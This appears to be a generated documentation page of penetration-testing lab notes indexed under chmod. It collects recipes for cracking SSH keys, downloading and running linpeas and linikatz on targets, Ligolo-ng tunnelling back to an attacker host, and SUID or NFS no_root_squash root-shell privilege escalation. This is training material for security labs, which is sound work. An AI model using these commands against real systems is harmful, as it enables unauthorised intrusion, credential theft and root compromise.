@@ -1,0 +1,248 @@
+---
+title: "chmod"
+sidebarTitle: "chmod"
+description: "Commands and examples collected from your chmod notes."
+keywords: ["chmod"]
+boost: 10
+hideFooterPagination: true
+---
+
+{/* Generated from Commands/chmod.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+[Search this tool’s saved examples](/commands/notebook?tool=chmod) · [All tools](/index)
+
+## Attacking SSH
+
+**Notebook example**
+
+```bash
+chmod 600 id_rsa
+ssh -i id_rsa user@<IP>
+```
+
+Saved as written; may include lab values or terminal output.
+
+[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Notebook recipes
+
+12 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+
+<AccordionGroup>
+
+<Accordion title="FinalRecon">
+
+### FinalRecon
+
+**DNS and Web Reconnaissance: Full Workflow**
+
+```bash
+# Install
+git clone https://github.com/thewhiteh4t/FinalRecon.git
+cd FinalRecon
+pip3 install -r requirements.txt
+chmod +x ./finalrecon.py
+
+# Header info + Whois
+./finalrecon.py --headers --whois --url http://<target>
+
+# Full recon
+./finalrecon.py --full --url http://<target>
+
+# Individual modules
+./finalrecon.py --headers --url http://<target>   # Headers
+./finalrecon.py --sslinfo --url http://<target>   # SSL cert info
+./finalrecon.py --whois --url http://<target>     # Whois lookup
+./finalrecon.py --crawl --url http://<target>     # Crawl site
+./finalrecon.py --dns --url http://<target>       # DNS enumeration (40+ record types)
+./finalrecon.py --sub --url http://<target>       # Subdomain enum (crt.sh, AnubisDB, etc.)
+./finalrecon.py --dir --url http://<target>       # Directory brute force
+./finalrecon.py --wayback --url http://<target>   # Wayback Machine URLs
+./finalrecon.py --ps --url http://<target>        # Port scan
+```
+
+</Accordion>
+
+<Accordion title="SSH (Port 22)">
+
+### SSH (Port 22)
+
+**Footprinting: Service-by-Service Lab Workflow**
+
+```bash
+# Password login
+ssh <user>@<IP>
+
+# Key-based login
+chmod 600 id_rsa
+ssh -i id_rsa <user>@<IP>
+
+# If key has passphrase — crack it
+ssh2john id_rsa > hash.txt
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+**Footprinting: Service-by-Service Lab Workflow**
+
+Context from the notebook: Lesson learned:  Found SSH private key via FTP (in  .ssh  directory) and via IMAP (in an email). Always fix permissions with  chmod 600  before using.
+
+```text
+chmod 600
+```
+
+</Accordion>
+
+<Accordion title="Enumeration (post-foothold)">
+
+### Enumeration (post-foothold)
+
+**HTB Nibbles: Walkthrough and Report**
+
+```bash
+# Attacker
+python3 -m http.server 8080
+
+# Target
+wget http://10.10.14.174:8080/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+```
+
+</Accordion>
+
+<Accordion title="2. Prepare the proxy on Kali">
+
+### 2. Prepare the proxy on Kali
+
+**Ligolo-ng Setup and BloodHound Collection**
+
+```bash
+mkdir -p ~/ligolo
+cd ~/ligolo
+chmod +x proxy
+./proxy -h
+```
+
+</Accordion>
+
+<Accordion title="Linux target">
+
+### Linux target
+
+**Ligolo-ng Setup and BloodHound Collection**
+
+```bash
+chmod +x agent
+./agent -connect KALI_IP:11601 -ignore-cert
+```
+
+</Accordion>
+
+<Accordion title="Create a SUID binary">
+
+### Create a SUID binary
+
+**Linux Privilege Escalation: Full Checklist**
+
+```bash
+print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
+gcc -o /tmp/suid /tmp/suid.c  
+sudo chmod +x /tmp/suid # execute right
+sudo chmod +s /tmp/suid # setuid bit
+```
+
+</Accordion>
+
+<Accordion title="NFS Root Squashing">
+
+### NFS Root Squashing
+
+**Linux Privilege Escalation: Full Checklist**
+
+```powershell
+# remote check the name of the folder
+showmount -e 10.10.10.10
+
+# create dir
+mkdir /tmp/nfsdir  
+
+# mount directory 
+mount -t nfs 10.10.10.10:/shared /tmp/nfsdir    
+cd /tmp/nfsdir
+
+# copy wanted shell 
+cp /bin/bash .  
+
+# set suid permission
+chmod +s bash
+```
+
+</Accordion>
+
+<Accordion title="Privilege escalation via no_root_squash">
+
+### Privilege escalation via no_root_squash
+
+**NFS Enumeration and Exports**
+
+```bash
+# On YOUR box (as root), inside the writable mounted share:
+cat > /tmp/nfs/shell.c <<'EOF'
+int main(void){ setuid(0); setgid(0); system("/bin/bash"); return 0; }
+EOF
+gcc /tmp/nfs/shell.c -o /tmp/nfs/rootshell      # compiles into the share as root
+chmod u+s /tmp/nfs/rootshell                     # set the SUID bit (stays because no_root_squash)
+
+# On the TARGET (via a low-priv shell on the box), in the same directory:
+./rootshell                                      # runs as root → root shell
+```
+
+</Accordion>
+
+<Accordion title="Tooling &amp; install">
+
+### Tooling & install
+
+**Pass the Certificate: PKINIT and Lab Walkthrough**
+
+```bash
+cat > ~/.local/bin/gettgtpkinit <<'EOF'
+#!/bin/bash
+exec /home/kali/Desktop/PKINITtools/.venv/bin/python /home/kali/Desktop/PKINITtools/gettgtpkinit.py "$@"
+EOF
+chmod +x ~/.local/bin/gettgtpkinit
+```
+
+</Accordion>
+
+<Accordion title="Linikatz">
+
+### Linikatz
+
+**Pass the Ticket from Linux**
+
+```bash
+wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
+chmod +x linikatz.sh
+```
+
+</Accordion>
+
+<Accordion title="Quick-start command cheat (run first, always)">
+
+### Quick-start command cheat (run first, always)
+
+**Privilege Escalation: Choose a Checklist**
+
+```bash
+# 1. Automated
+wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas.out
+
+# 2. Manual "big 6"
+id; sudo -l; find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null; cat /etc/crontab; uname -a
+```
+
+</Accordion>
+
+</AccordionGroup>
